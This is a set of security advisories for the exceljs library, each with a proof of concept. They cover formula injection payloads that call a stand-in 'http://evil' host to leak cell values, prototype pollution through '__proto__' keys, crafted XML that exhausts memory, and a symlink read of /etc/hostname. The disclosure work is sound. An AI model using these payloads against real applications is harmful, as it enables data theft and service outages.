data.summary: Invalid or empty creation date makes writing the workbook fail
data.description:
### Summary

A workbook whose `dcterms:created` is unparsable or empty loads normally, but writing it back throws a `RangeError`.


### Details

The invalid date loads as `Invalid Date`. On write, the core properties formatter calls `toISOString()` on it without checking validity, which throws.


### Proof of concept

In `docProps/core.xml` of any valid workbook:

```xml
<dcterms:created xsi:type="dcterms:W3CDTF">garbage</dcterms:created>
```

An empty element behaves the same.

```js
const wb = new ExcelJS.Workbook();
await wb.xlsx.load(buffer);          // succeeds, wb.created is Invalid Date

await wb.xlsx.writeBuffer();
// RangeError: Invalid time value
```


### Impact

Any upload, clean, re-export pipeline fails on such a file. Empty date elements occur in files produced by other tools.

cwes.name: Improper Input Validation

data.summary: Formula injection through `containsText` conditional formatting
data.description:
### Summary

The text of a `containsText` conditional formatting rule is placed in a formula string literal without escaping double quotes. A crafted text leaves the string and injects formula code.


### Details

The rule generates `NOT(ISERROR(SEARCH("<text>",<cell>)))`. Inside an Excel string literal a `"` must be written `""`; it was not.


### Proof of concept

```js
const ws = wb.addWorksheet('S');
ws.addRows([['hello'], ['x']]);

ws.addConditionalFormatting({
  ref: 'A1:A2',
  rules: [{
    type: 'containsText',
    operator: 'containsText',
    text: 'a")),HYPERLINK("http://evil","x")&("',
    style: { font: { bold: true } },
    priority: 1,
  }],
});
```

The rule formula in the sheet XML becomes:

```
NOT(ISERROR(SEARCH("a")),HYPERLINK("http://evil","x")&("",A1)))
```

An ordinary text such as `say "hi"` already produces an invalid formula.


### Impact

When the search term comes from a user, the generated workbook contains a formula chosen by that user. The result of a conditional formatting formula is only used as a condition, so the practical reach is limited, and ordinary quoted text breaks the rule.

cwes.name: Improper Neutralization of Formula Elements in a CSV File

data.summary: Formula injection through table column names in the totals row
data.description:
### Summary

The totals row formula of a table is built from the column name without escaping. A crafted column name injects an arbitrary formula into the generated workbook.


### Details

The formula is built as `SUBTOTAL(109,<table>[<column>])`. In an Excel structured reference, `[`, `]`, `#` and `'` must be escaped with a leading `'`; they were not, so a `]` in the name closes the reference.


### Proof of concept

```js
const ws = wb.addWorksheet('S');

ws.addTable({
  name: 'T',
  ref: 'A1',
  headerRow: true,
  totalsRow: true,
  columns: [
    { name: 'k' },
    { name: 'Amount])+HYPERLINK("http://evil/?"&A2,"x")+SUM(T[Amount', totalsRowFunction: 'sum' },
  ],
  rows: [['a', 1], ['b', 2]],
});
```

The totals cell contains:

```
SUBTOTAL(109,T[Amount])+HYPERLINK("http://evil/?"&A2,"x")+SUM(T[Amount])
```

A name such as `It's [x] #1` also produces an invalid reference.


### Impact

When column names come from untrusted data (imported CSV headers, for example), the generated workbook contains a formula chosen by the attacker. Functions such as `HYPERLINK` can leak cell values once the user enables editing and clicks.

cwes.name: Improper Neutralization of Formula Elements in a CSV File

data.summary: Streaming reader never settles on a corrupt compressed entry
data.description:
### Summary

A workbook with a corrupt compressed worksheet makes the streaming reader's iteration neither resolve nor reject. The caller waits forever, and descriptors are retained.


### Details

While copying a worksheet to a temporary file, the reader listens for errors on the file stream only. A corrupt deflate stream raises its error on the ZIP entry, which nobody listens to, so the promise stays pending.

Loading the same file with `xlsx.load()` rejects correctly.


### Proof of concept

Flip some bytes in the compressed data of `xl/worksheets/sheet1.xml` of a valid workbook, then:

```js
const reader = new ExcelJS.stream.xlsx.WorkbookReader('corrupt.xlsx', {
  worksheets: 'emit', sharedStrings: 'cache',
});

for await (const ws of reader) {      // never resolves, never throws
  for await (const row of ws) { /* … */ }
}
```

Each read retains two file descriptors. Outside a server, the process exits silently with code 0.


### Impact

Requests that read untrusted uploads hang indefinitely, since no `catch` is ever reached, and each one holds resources. A small file is enough.

cwes.name: Improper Handling of Exceptional Conditions
Missing Release of Resource after Effective Lifetime

data.summary: Memory exhaustion through a huge image anchor
data.description:
### Summary

A workbook with an image anchored at a very large column crashes the process when the application reads the image position.


### Details

Anchor coordinates are read from the drawing without bounds. Computing the column position of an anchor walks the column list up to that index and allocates the missing columns.


### Proof of concept

In `xl/drawings/drawing1.xml` of a workbook containing an image:

```xml
<xdr:from><xdr:col>300000000</xdr:col> … </xdr:from>
```

```js
const wb = new ExcelJS.Workbook();
await wb.xlsx.load(buffer);              // 12 ms

wb.getWorksheet('S').getImages()[0].range.tl.col;
// FATAL ERROR: ... JavaScript heap out of memory
```

With `3000000`, the same read takes about 0.5 s and 640 MB of memory.


### Impact

Denial of service when the application reads image positions, which is the standard way to extract images from a workbook. The abort is a fatal V8 error that `try/catch` cannot handle.

cwes.name: Allocation of Resources Without Limits or Throttling

data.summary: Event loop blocking through huge row numbers
data.description:
### Summary

A workbook with a row numbered far beyond Excel's limit loads instantly, then makes every pass over the sheet slow.


### Details

Rows are stored in a sparse array indexed by the `r` attribute. Reading values, writing the workbook or exporting to CSV all iterate up to the largest row number. Excel's maximum is 1,048,576.


### Proof of concept

In `xl/worksheets/sheet1.xml` of any valid workbook:

```xml
<row r="20000000"><c r="A20000000"><v>1</v></c></row>
```

```js
const wb = new ExcelJS.Workbook();
await wb.xlsx.load(buffer);              // 12 ms

wb.getWorksheet('S').getSheetValues();   // 0.6 s
await wb.xlsx.writeBuffer();             // 1.2 s
await wb.csv.writeBuffer();              // 6.2 s
```

The cost is linear in the row number.


### Impact

Denial of service: the event loop is blocked for the duration of each pass, and the delay grows with the row number chosen by the attacker.

cwes.name: Allocation of Resources Without Limits or Throttling

data.summary: Event loop blocking through a huge worksheet id
data.description:
### Summary

A workbook with a very large `sheetId` loads instantly, then blocks the event loop for seconds each time the worksheets are accessed or the workbook is written.


### Details

Worksheets are stored in a sparse array indexed by their `sheetId`. Every access that walks the array (`worksheets`, `getWorksheet(name)`, `writeBuffer()`) costs time proportional to the largest id.


### Proof of concept

In `xl/workbook.xml` of any valid workbook:

```xml
<sheet name="S" sheetId="100000000" r:id="rId1"/>
```

```js
const wb = new ExcelJS.Workbook();
await wb.xlsx.load(buffer);        // 12 ms

wb.worksheets;                     // blocks for about 11 s
await wb.xlsx.writeBuffer();       // blocks for about 21 s
```

The cost grows linearly with the id, up to the 32-bit limit.


### Impact

Denial of service: the process serves no other request while it walks the array. The block is triggered by ordinary use of the loaded workbook, not by any unusual call.

cwes.name: Allocation of Resources Without Limits or Throttling

data.summary: Prototype pollution through a conditional formatting extension id
data.description:
### Summary

Loading a crafted `.xlsx` pollutes `Object.prototype` for the whole Node.js process, with attacker-chosen string values on common property names. No authentication is needed beyond submitting a file to an application that calls `xlsx.load()`.


### Details

Conditional formatting rules and their `x14` extensions are matched through plain objects keyed by values read from the file (the rule id and the range).

With the id `__proto__`, the lookup returns `Object.prototype`, and the merge step copies every property of the extension rule onto it.


### Proof of concept

Create a workbook with a `dataBar` conditional formatting, then set the `id` of its `<x14:cfRule>` in `xl/worksheets/sheet1.xml` to `__proto__`:

```xml
<x14:cfRule type="dataBar" id="__proto__">…</x14:cfRule>
```

```js
const wb = new ExcelJS.Workbook();
await wb.xlsx.load(buffer);

Object.keys(Object.prototype);
// [ 'type', 'x14Id', 'cfvo', 'minLength', 'maxLength', 'border', 'gradient',
//   'negativeBarColorSameAsPositive', 'negativeBarBorderColorSameAsPositive',
//   'axisPosition', 'direction' ]

({}).type;   // 'dataBar'
```


### Impact

Every object in the process inherits these properties, with values chosen by the attacker. Names such as `type`, `direction` or `border` are used by many libraries, so application logic can be altered until the process restarts.

cwes.name: Improperly Controlled Modification of Object Prototype Attributes

data.summary: CI workflow uses a third-party action pinned by tag with default token permissions
data.description:
### Summary

The asset-size workflow runs a third-party action referenced by a mutable tag, passes it the repository token, and declares no `permissions` block.


### Details

```yaml
on: [pull_request]

steps:
  - uses: actions/checkout@v2
  - uses: chrysanthos/simple-asset-size-reporter@1.0.2
    with:
      repo-token: "${{ secrets.GITHUB_TOKEN }}"
```

A tag can be moved to another commit, so the code that receives the token is not fixed. Without a `permissions` block, the token gets the repository's default permissions.


### Proof of concept

The action is resolved by tag when the job runs:

```sh
git ls-remote https://github.com/chrysanthos/simple-asset-size-reporter refs/tags/1.0.2
```

This prints whichever commit the tag points to at that moment. The owner of the action can move the tag to a commit that reads `INPUT_REPO-TOKEN`, and the next pull request run executes it with the repository token.

Because the workflow has no `permissions` block, that token carries the repository's default scopes, which may include write access.


### Impact

If the action's repository is compromised or its tag is retargeted, the code runs in the project's CI with the repository token. Runs triggered by pull requests from forks only get a read-only token. The published package is not affected.

cwes.name: Execution with Unnecessary Privileges
Inclusion of Functionality from Untrusted Control Sphere

data.summary: `safeJoin` follows symbolic links out of the base directory
data.description:
### Summary

`utils.safeJoin(baseDir, userPath)` rejects `..` traversal but accepts a path that goes through a symbolic link pointing outside `baseDir`.


### Details

The containment check compares the lexical paths only. It does not resolve symbolic links, so a link located inside the base directory is treated as being inside it, wherever it points.


### Proof of concept

```js
fs.mkdirSync('/srv/assets');
fs.symlinkSync('/etc/hostname', '/srv/assets/link.png');

ExcelJS.utils.safeJoin('/srv/assets', 'link.png');
// '/srv/assets/link.png'  (accepted)
```

Passing that path to `addImage({ filename })` embeds the content of `/etc/hostname` in the workbook.


### Impact

Disclosure of local files readable by the process, when an attacker can create a symbolic link under the base directory (extracted archives, shared or uploaded folders).

cwes.name: Improper Limitation of a Pathname to a Restricted Directory
Improper Link Resolution Before File Access

data.summary: CSV formula injection after an embedded list separator
data.description:
### Summary

The CSV export neutralizes values that begin with `=`, `+`, `-` or `@`, but not values where one of those characters follows a list separator inside the field.


### Details

The file is written with `,` as the separator, and only the first character of each field is checked.

A spreadsheet opened in a locale where the list separator is `;` (French, German…) splits `x;=1+1` into two cells, and the second one starts with `=`.


### Proof of concept

```js
const ws = wb.addWorksheet('S');
ws.addRow(['x;=1+1', 'ok']);

(await wb.csv.writeBuffer()).toString();
// x;=1+1,ok
```

Opened with `;` as the list separator, the file shows `x` and a live formula `=1+1`.


### Impact

A formula chosen by the attacker is evaluated for whoever opens the export, which can leak data through functions such as `HYPERLINK`.

It requires the victim's separator setting and their confirmation to enable editing.

cwes.name: Improper Neutralization of Formula Elements in a CSV File

data.summary: Regular expression denial of service when reading shared formulas
data.description:
### Summary

Reading `cell.formula` on a shared formula child cell blocks the event loop for several seconds when the master formula is very long.


### Details

The formula is translated to the child's position with a regular expression whose cost is quadratic in the length of runs of identifier characters.

Excel limits a formula to 8,192 characters, where the cost is about 30 ms. The library applied no limit.


### Proof of concept

Add two rows to `xl/worksheets/sheet1.xml` of a valid workbook, with a master formula of 100,000 characters:

```xml
<row r="3"><c r="A3"><f t="shared" ref="A3:A4" si="0">----------…(100000 chars)</f><v>0</v></c></row>
<row r="4"><c r="A4"><f t="shared" si="0"/><v>0</v></c></row>
```

```js
const wb = new ExcelJS.Workbook();
await wb.xlsx.load(buffer);

wb.getWorksheet('S').getCell('A4').formula;   // blocks for about 4.9 s
```

Cost for the same pattern: 40,000 characters take 0.8 s, 100,000 take 4.9 s.


### Impact

Denial of service: the event loop is blocked for the duration of each read, and the delay multiplies with the number of crafted cells.

cwes.name: Inefficient Regular Expression Complexity

data.summary: Missing decompression limits in the streaming reader
data.description:
### Summary

The streaming reader (`stream.xlsx.WorkbookReader`) applies no limit to the size of what it decompresses. A small crafted archive makes it consume unbounded memory, CPU or disk.


### Details

The limits available when loading a workbook with `xlsx.load()` are not applied by the streaming reader.

Two paths grow with the input:

- With `sharedStrings: 'cache'`, every string is kept in memory.
- Worksheets stored before `xl/sharedStrings.xml` are first copied to temporary files, whatever their size.


### Proof of concept

Replace `xl/sharedStrings.xml` of a valid workbook with four million entries. The file stays around 170 KB once compressed:

```js
const sst =
  '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">' +
  '<si><t>a</t></si>'.repeat(4_000_000) +
  '</sst>';
```

```js
const reader = new ExcelJS.stream.xlsx.WorkbookReader('crafted.xlsx', { sharedStrings: 'cache' });
for await (const ws of reader) {
  for await (const row of ws) { /* ... */ }
}
```

Memory grows linearly with the number of entries: 245 MB of RSS for 4 million, against 152 MB with `sharedStrings: 'ignore'`. Larger archives scale accordingly.


### Impact

Denial of service through memory exhaustion, or through a full temporary directory, in applications that read untrusted uploads with the streaming reader.

cwes.name: Allocation of Resources Without Limits or Throttling

data.summary: Process crash through an oversized defined name range
data.description:
### Summary

A workbook of a few KB with a defined name covering a whole sheet aborts the Node.js process with an out-of-memory error when loaded.


### Details

Cell ranges of defined names are expanded cell by cell into a matrix when the workbook is loaded.

`$A$1:$XFD$1048576` covers about 17 billion cells, far beyond available memory.


### Proof of concept

In `xl/workbook.xml` of any valid workbook that contains a sheet named `S`, add inside `<definedNames>`:

```xml
<definedName name="x">S!$A$1:$XFD$1048576</definedName>
```

```js
await new ExcelJS.Workbook().xlsx.load(buffer);
// FATAL ERROR: ... JavaScript heap out of memory   (node --max-old-space-size=512)
```

The file is about 6 KB.


### Impact

Denial of service. The abort is a fatal V8 error, not an exception: it cannot be handled with `try/catch` and takes down the whole process.

cwes.name: Allocation of Resources Without Limits or Throttling

data.summary: Event loop blocking and memory exhaustion through an oversized data validation range
data.description:
### Summary

A workbook of a few KB with a very large data validation range blocks the event loop and then exhausts memory when loaded.


### Details

Each address of a `sqref` range is stored individually in the validation model.

`A1:XFD1048576` expands to about 17 billion entries, so the load never completes and ends in an out-of-memory abort.


### Proof of concept

In `xl/worksheets/sheet1.xml` of any valid workbook:

```xml
<dataValidations count="1">
  <dataValidation type="list" sqref="A1:XFD1048576"><formula1>"a,b"</formula1></dataValidation>
</dataValidations>
```

```js
await new ExcelJS.Workbook().xlsx.load(buffer);
// event loop blocked, then: FATAL ERROR: ... JavaScript heap out of memory
```

The file is about 6 KB.


### Impact

Denial of service. While the load runs, the process serves no other request. It ends in a fatal V8 abort that cannot be handled with `try/catch`.

cwes.name: Inefficient Algorithmic Complexity
Allocation of Resources Without Limits or Throttling

data.summary: Process crash through an oversized column range
data.description:
### Summary

A workbook of a few KB with a huge `<col>` range aborts the Node.js process with an out-of-memory error when loaded.


### Details

For each `<col min max>` read from the file, one `Column` object is created for every column index in the range.

The upper bound is not limited to the 16,384 columns that Excel supports, so `max="300000000"` allocates 300 million objects.


### Proof of concept

In `xl/worksheets/sheet1.xml` of any valid workbook:

```xml
<cols><col min="1" max="300000000" width="10" customWidth="1"/></cols>
```

```js
await new ExcelJS.Workbook().xlsx.load(buffer);
// FATAL ERROR: ... JavaScript heap out of memory
```

The file is about 6 KB. The process aborts in a few seconds.


### Impact

Denial of service. The abort is a fatal V8 error, not an exception: it cannot be handled with `try/catch` and takes down the whole process.

cwes.name: Allocation of Resources Without Limits or Throttling

data.summary: Process crash through an oversized merged cell range
data.description:
### Summary

A workbook of a few KB with a very large merged range aborts the Node.js process with an out-of-memory error when loaded.


### Details

Merged ranges read from the file are expanded cell by cell into worksheet cells.

`A1:XFD1048576` is a valid range for Excel, and it covers about 17 billion cells. Memory is exhausted long before the expansion ends, and V8 aborts the process.


### Proof of concept

In `xl/worksheets/sheet1.xml` of any valid workbook:

```xml
<mergeCells count="1"><mergeCell ref="A1:XFD1048576"/></mergeCells>
```

```js
await new ExcelJS.Workbook().xlsx.load(buffer);
// FATAL ERROR: ... JavaScript heap out of memory
```

The file is about 6 KB. The process aborts in a few seconds.


### Impact

Denial of service. The abort is a fatal V8 error, not an exception: it cannot be handled with `try/catch` and takes down the whole process, including every other request it serves.

cwes.name: Allocation of Resources Without Limits or Throttling

data.summary: Prototype pollution through a defined name on a sheet named `__proto__`
data.description:
### Summary

Loading a crafted `.xlsx` pollutes `Object.prototype` for the whole Node.js process. No authentication is needed beyond the ability to submit a file to an application that calls `xlsx.load()`.

### Details

Defined names are expanded into a `CellMatrix`, which stores sheets in a plain object keyed by the sheet name found in the file.

With the sheet name `__proto__`, `this.sheets['__proto__']` resolves to `Object.prototype`, and the row and cell arrays are then written straight onto it.

The polluted keys are the row numbers of the range, each holding an empty array.

### Proof of concept

In `xl/workbook.xml` of any valid workbook, add inside `<definedNames>`:

```xml
<definedName name="x">__proto__!$A$1:$A$3</definedName>
```

Then:

```js
const wb = new ExcelJS.Workbook();
await wb.xlsx.load(buffer);

Object.keys(Object.prototype); // [ '1', '2', '3' ]
({})[2];                       // []  (truthy)
```

### Impact

Every object in the process now inherits attacker-chosen numeric keys holding empty arrays.

Code that tests `if (map[id])`, iterates with `for…in`, or relies on a key being absent can be broken or bypassed. The effect lasts until the process restarts.

cwes.name: Improperly Controlled Modification of Object Prototype Attributes

data.summary: Uncontrolled Resource Consumption in exceljs via `Workbook.xlsx.load()`
data.description:
### Impact

`Workbook.xlsx.load()` (`lib/xlsx/xlsx.js`) decompresses every zip entry
of an uploaded `.xlsx` fully into memory, with no limit on total size,
per-entry size, or compression ratio. A small, highly-compressible file
(a few hundred KB) can expand to gigabytes in memory before any XML is
parsed.

Any service that calls `load()`/`readFile()` on an untrusted or
user-uploaded file can be crashed by a single small upload. Measured:
a ~1.5MB crafted file expanding to ~1.5GB was enough to exceed a 512MB
container memory limit and get the process killed by the OOM killer.

### Patches

Not patched upstream. Patched in the unofficial fork
`exceljs-hardened >= 5.0.0`, which reads each zip entry's declared
uncompressed size from the archive's central directory before
decompressing it, and rejects the file if a single entry (128MB
default) or the archive total (512MB default) exceeds a configurable
limit.

### Workarounds

Run `load()` inside a process/container with a hard memory limit so a
crash is contained, and/or pre-check the uploaded file's declared
uncompressed sizes (from the zip central directory) before calling
`load()`. Restricting upload file size alone is not sufficient — the
file on disk can be small.

### References

- Fix: `exceljs-hardened` (https://github.com/mateocallec/exceljs-hardened), `lib/utils/decompression-guard.js`

cwes.name: Improper Handling of Highly Compressed Data (Data Amplification)

data.summary: CSV Formula Injection in exceljs via `CSV.write()`
data.description:
### Impact

`CSV.write()` (`lib/csv/csv.js`) writes cell values to CSV output with
no check for leading `=`, `+`, `-`, or `@` characters. A cell value
starting with one of them is interpreted as a live formula by Excel or
LibreOffice Calc when the exported file is opened.

Any application that exports user-influenced data to CSV via
`workbook.csv.write()`/`writeBuffer()`/`writeFile()` can have that data
weaponized against whoever opens the export — for example DDE-style
command execution, or exfiltration of other cells in the same file via
`HYPERLINK()`/`WEBSERVICE()` beacons to an attacker-controlled server.
The attacker does not need access to the exported file themselves; they
only need to influence one value that ends up in it.

### Patches

Not patched upstream. Patched in the unofficial fork
`exceljs-hardened >= 5.0.0`, which prefixes values starting with
`=`, `+`, `-`, `@`, tab, or CR with a neutralizing apostrophe before
writing them, on by default (`options.escapeFormulas`).

### Workarounds

Sanitize values yourself before calling `workbook.csv.write()`: prefix
any string beginning with `=`, `+`, `-`, `@`, tab, or CR with a single
quote (`'`). Alternatively, avoid opening CSV exports of
user-influenced data directly in a spreadsheet application.

### References

- Fix: `exceljs-hardened` (https://github.com/mateocallec/exceljs-hardened), `lib/utils/csv-formula-guard.js`
- OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection

cwes.name: Improper Neutralization of Formula Elements in a CSV File

data.summary: Path Traversal in exceljs via `Workbook.addImage({filename})`
data.description:
### Impact

`Workbook.addImage({filename})` passes `filename` directly to
`fs.readFile()` (`lib/xlsx/xlsx.js`, `addMedia()`) with no validation.
The library's own source flags this with a `// TODO: validation?`
comment.

An application that builds this path by joining a base directory with
a user-supplied fragment (e.g. selecting a logo/asset by name) is
exposed to `../` traversal. Because `path.join()` resolves and strips
`..` segments before the string reaches `addImage()`, checks performed
after the join cannot catch it — the containment check has to happen as
part of the join itself.

Any file readable by the Node.js process can be read this way and is
returned to the requester embedded inside a normal-looking `.xlsx`
download (`xl/media/imageN.<ext>`).

### Patches

Not patched upstream. Patched in the unofficial fork
`exceljs-hardened >= 5.0.0`, which adds `ExcelJS.utils.safeJoin(baseDir,
userInput)` — a replacement for `path.join()` that resolves and checks
containment as a single operation — plus a secondary check in
`addImage()`/`addMedia()` that rejects raw paths containing `..`.

### Workarounds

Never build an `addImage({filename})` path by joining a base directory
with user input via `path.join()` alone. Resolve the final path and
verify it starts with the intended base directory before use, or map
user input to a fixed set of known-safe paths instead of accepting a
path fragment.

### References

- Fix: `exceljs-hardened` (https://github.com/mateocallec/exceljs-hardened), `lib/utils/media-path-guard.js`

cwes.name: Improper Limitation of a Pathname to a Restricted Directory
External Control of File Name or Path

data.summary: Prototype Pollution in exceljs via `Note.model` / `_.deepMerge`
data.description:
### Impact

`_.deepMerge()` (`lib/utils/under-dash.js`) merges objects without
filtering `__proto__`, `constructor`, or `prototype` keys. It is reached
through `Note.prototype.get model()` whenever a workbook is serialized
after a cell's `.note` was set to a non-string value
(`cell.note = <object>`).

If an application assigns user-controlled JSON to `cell.note` (a
plausible pattern for a "comment" or "annotation" feature), a payload
containing an own `"__proto__"` key — trivial via `JSON.parse`, which
does not special-case that key the way an object literal does — reaches
the global `Object.prototype` and can set arbitrary properties on it.
This affects every plain object created afterward in the same process,
not just the request that sent the payload.

Confirmed impact: an unrelated endpoint that builds a plain object and
trusts a property on it for an authorization decision (a common pattern)
can be made to return a different result after a single unauthenticated
request, with no further interaction from the attacker.

### Patches

Not patched upstream. No maintained release of `exceljs` addresses this.
Patched in the unofficial fork `exceljs-hardened >= 5.0.0`, which filters
`__proto__`/`constructor`/`prototype` in `deepMerge()`.

### Workarounds

Do not pass unvalidated/parsed JSON directly into `cell.note`. If the
value must come from user input, allow-list the expected keys
(`texts`, `margins`, `protection`, `editAs`) before assigning it.

### References

- Fix: `exceljs-hardened` (https://github.com/mateocallec/exceljs-hardened), `lib/utils/under-dash.js`
